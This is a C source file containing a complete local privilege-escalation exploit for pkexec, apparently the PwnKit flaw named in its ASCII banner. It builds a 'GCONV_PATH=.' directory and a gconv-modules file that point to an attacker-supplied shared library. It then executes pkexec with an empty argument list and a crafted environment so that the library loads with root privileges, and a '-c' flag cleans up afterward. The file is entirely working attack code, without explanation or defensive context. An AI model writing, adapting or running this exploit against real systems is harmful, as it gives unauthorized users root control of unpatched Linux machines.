#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>


#define CHARSET         "AS"
#define DIRNAME         "IN"
#ifndef LIBNAME
#define LIBNAME         "FRUITLOOPS"
#endif
#define DEFAULT_FROM    "UTF-8"
#define DEFAULT_PATH    "/usr/bin/pkexec"

void usage(const char *name) __attribute__((noreturn));

void banner(void)
{
    puts("-----------------------------------------------------------------------------");
    puts(" __\\ / __   __  _ __           _ __        |    \\ / _ ___");
    puts("/   V |_ --- _)/ \\ _)/| ---|_|/ \\__)|_|    |     V |_) _/|_|");
    puts("\\__   |__   /__\\_//__ |      |\\_/__)  |    |       | \\/__| |");
    puts("-----------------------------------------------------------------------------");
}

void usage(const char *name)
{
    banner();
    fprintf(stderr, "%s [-c] [-h] [-f from_charset] [-p /path/to/pkexec]\n", name);
    fprintf(stderr, "-----------------------------------------------------------------------------\n");
    fprintf(stderr, "\t-c\t\t\tJust teardown - don't exploit\n");
    fprintf(stderr, "\t-p <path>\t\tPath to pkexec (default: \"%s\")\n", DEFAULT_PATH);
    fprintf(stderr, "\t-f <from_charset>\tCustom \"from\" charset (default: \"%s\")\n", DEFAULT_FROM);
    fprintf(stderr, "\t-h\t\t\tDisplay this message\n");
    exit(1);
}

int setup(const char *from_charset)
{
    int dummy;
    FILE *gm;

    if (mkdir("GCONV_PATH=.", 0711) == -1) {
        fprintf(stderr, "mkdir: %s\n", strerror(errno));
        return -1;
    }

    if (mkdir(DIRNAME, 0711) == -1) {
        fprintf(stderr, "mkdir: %s\n", strerror(errno));
        return -1;
    }

    dummy = creat("GCONV_PATH=./" DIRNAME, 0711);
    if (dummy == -1) {
        fprintf(stderr, "creat: %s\n", strerror(errno));
        return -1;
    }

    close(dummy);

    gm = fopen(DIRNAME "/gconv-modules", "w");

    if (!gm) {
        fprintf(stderr, "fopen: %s\n", strerror(errno));
        return -1;
    }

    fprintf(gm, "module\t%s//\t%s//\t%s\t1\n", from_charset, CHARSET, LIBNAME);
    fclose(gm);

    if (rename(LIBNAME ".so", DIRNAME "/" LIBNAME ".so") == -1) {
        fprintf(stderr, "rename: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

void teardown(void)
{
    struct stat check;

    if (stat("GCONV_PATH=.", &check) != -1) {
        if (unlink("GCONV_PATH=./" DIRNAME) == -1)
            fprintf(stderr, "unlink: %s\n", strerror(errno));

        if (rmdir("GCONV_PATH=.") == -1)
            fprintf(stderr, "rmdir: %s\n", strerror(errno));
    }

    if (stat(DIRNAME, &check) != -1) {
        if (rename(DIRNAME "/" LIBNAME ".so", "./" LIBNAME ".so") == -1)
            fprintf(stderr, "rename: %s\n", strerror(errno));

        if (unlink(DIRNAME "/gconv-modules") == -1)
            fprintf(stderr, "unlink: %s\n", strerror(errno));

        if (rmdir(DIRNAME) == -1)
            fprintf(stderr, "rmdir: %s\n", strerror(errno));
    }
}

int main(int argc, char **argv)
{
    if (argc < 1) // we do a little trolling
        return 1;

    int opt, clean = 0;
    const char *pkexec_path = DEFAULT_PATH,
               *from_chrst = DEFAULT_FROM;

    char * const args[] = { NULL };
    char * const envs[] = { DIRNAME, "PATH=GCONV_PATH=.", "CHARSET=" CHARSET,
                            "GIO_USE_VFS=", "SHELL=installgentoo", NULL };

    while ((opt = getopt(argc, argv, "cf:hp:x")) != -1) {
        switch (opt) {
        case 'c':
            clean = 1;
            break;
        case 'p':
            pkexec_path = optarg;
            break;
        case 'f':
            from_chrst = optarg;
            break;
        case 'h':
        default:
            usage(argv[0]);
            break;
        }
    }

    teardown();

    if (clean)
        return 0;

    banner();

    if (!pkexec_path)
        pkexec_path = DEFAULT_PATH;

    if (setup(from_chrst) == -1)
        return 1;

    execve(pkexec_path, args, envs);
    fprintf(stderr, "[!] execve: %s\n", strerror(errno));

    return 0;
}
